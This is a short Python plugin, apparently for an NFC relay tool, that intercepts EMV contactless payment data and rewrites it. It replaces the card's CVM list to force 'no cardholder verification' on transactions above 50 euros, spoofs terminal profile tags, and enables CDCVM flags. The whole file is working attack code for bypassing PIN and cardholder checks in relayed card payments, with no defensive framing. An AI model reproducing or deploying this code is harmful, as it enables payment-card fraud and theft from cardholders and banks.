import logging
from binascii import hexlify, unhexlify
from plugins.c2c_pb2 import NFCData

def replace_emv_tag(data, tag, new_value):
    tag_hex = tag.encode('ascii')
    new_value_hex = new_value.encode('ascii')
    if tag_hex in data:
        start_idx = data.index(tag_hex)
        len_idx = start_idx + len(tag_hex)
        length = int(data[len_idx:len_idx+2], 16)
        value_start = len_idx + 2
        value_end = value_start + length * 2
        new_data = data[:value_start] + new_value_hex + data[value_end:]
        return new_data
    return data

def force_no_cvm(data):
    return replace_emv_tag(data, '8E', '0000')

def set_fake_terminal_profile(data):
    data = replace_emv_tag(data, '9F66', 'B6004000')
    data = replace_emv_tag(data, '9F33', 'E0B0C8')
    return data

def support_cdcvm(data):
    return replace_emv_tag(data, '9F35', '22')

def handle_data(logger, data, state):
    try:
        state['cdcvm_enabled'] = True  # Enable CDCVM support by default
        nfc_data = NFCData()
        nfc_data.ParseFromString(data)
        raw_data = hexlify(nfc_data.data).decode()
        logger(f"Original NFC data: {raw_data}")
        if '9F02' in raw_data:
            amount_idx = raw_data.index('9F02') + 6
            amount = int(raw_data[amount_idx:amount_idx+12], 16) / 100
            if amount > 50:
                logger(f"High-value transaction detected: {amount}€, forcing NoCVM")
                raw_data = force_no_cvm(raw_data)
        logger("Applying fake terminal profile")
        raw_data = set_fake_terminal_profile(raw_data)
        if state.get('cdcvm_enabled', False):
            logger("Enabling CDCVM support")
            raw_data = support_cdcvm(raw_data)
        nfc_data.data = unhexlify(raw_data)
        modified_data = nfc_data.SerializeToString()
        logger(f"Modified NFC data: {hexlify(modified_data).decode()}")
        return modified_data
    except Exception as e:
        logger(f"Error in EMV manipulation: {str(e)}")
        return data
